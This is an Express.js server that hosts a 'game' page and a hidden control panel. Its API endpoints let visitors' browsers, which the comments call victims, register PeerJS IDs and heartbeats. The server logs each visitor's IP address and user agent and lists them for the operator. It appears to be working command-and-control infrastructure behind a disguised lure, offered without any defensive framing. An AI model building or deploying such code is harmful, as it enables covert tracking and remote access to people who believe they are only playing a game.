const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;

// Sanitize user input for safe logging (prevent log injection)
function sanitizeLog(str) {
  if (typeof str !== 'string') return String(str);
  return str.replace(/[\r\n\t]/g, '').substring(0, 100);
}

// In-memory peer tracking
const activePeers = new Map();

app.use(express.json({ limit: '5mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Main game page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Control panel
app.get('/control', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'control.html'));
});

// ========== REST API for Peer Tracking ==========

// Victim registers its PeerJS ID
app.post('/api/register', (req, res) => {
  const { peerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || '';
  activePeers.set(peerId, { ip, ua, time: Date.now(), lastSeen: Date.now() });
  console.log(`[+] Peer registered: ${sanitizeLog(peerId)} from ${sanitizeLog(ip)}`);
  res.json({ ok: true });
});

// Victim sends heartbeat to stay alive
app.post('/api/heartbeat', (req, res) => {
  const { peerId } = req.body;
  const peer = activePeers.get(peerId);
  if (peer) {
    peer.lastSeen = Date.now();
  }
  res.json({ ok: true });
});

// Victim unregisters when leaving
app.post('/api/unregister', (req, res) => {
  const { peerId } = req.body;
  activePeers.delete(peerId);
  console.log(`[-] Peer unregistered: ${sanitizeLog(peerId)}`);
  res.json({ ok: true });
});

// Control panel fetches active peers
app.get('/api/peers', (req, res) => {
  // Clean up stale peers (no heartbeat for 90 seconds)
  const now = Date.now();
  for (const [id, data] of activePeers) {
    if (now - data.lastSeen > 90000) {
      activePeers.delete(id);
      console.log(`[x] Stale peer removed: ${sanitizeLog(id)}`);
    }
  }
  const peers = [];
  for (const [peerId, data] of activePeers) {
    peers.push({
      peerId,
      ip: data.ip,
      ua: data.ua,
      time: data.time
    });
  }
  res.json(peers);
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Game:    http://localhost:${PORT}/`);
  console.log(`Control: http://localhost:${PORT}/control`);
});
